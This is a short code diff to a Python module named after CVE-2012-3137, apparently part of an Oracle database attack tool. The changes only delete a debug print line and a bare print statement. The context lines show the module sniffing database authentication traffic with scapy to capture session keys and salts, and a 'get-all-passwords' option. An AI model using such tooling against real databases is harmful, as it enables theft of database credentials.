@@ -102,7 +102,6 @@ class CVE_2012_3137 ():
 							return True
 			return False
 		self.__resetSessionKeyValueAndSalt__()
-		#print "Run with tcp and host {0} and port {1}".format(ip,port)
 		scapyall.sniff(filter="tcp and host {0} and port {1}".format(ip,port), count=self.MAX_PACKET_TO_CAPTURE, timeout=self.TIMEOUT, stop_filter=customAction,store=False)
 		return sessionKey, salt
 
@@ -266,7 +265,6 @@ def runCVE20123137Module(args):
 		cve.testAll()
 	#Option 1: get all passwords
 	if args['get-all-passwords'] != None:
-		print 
 		if geteuid() != 0:
 			args['print'].badNews("Sorry, you need to run this as root because I need to sniff authentications to the database")
 		else:
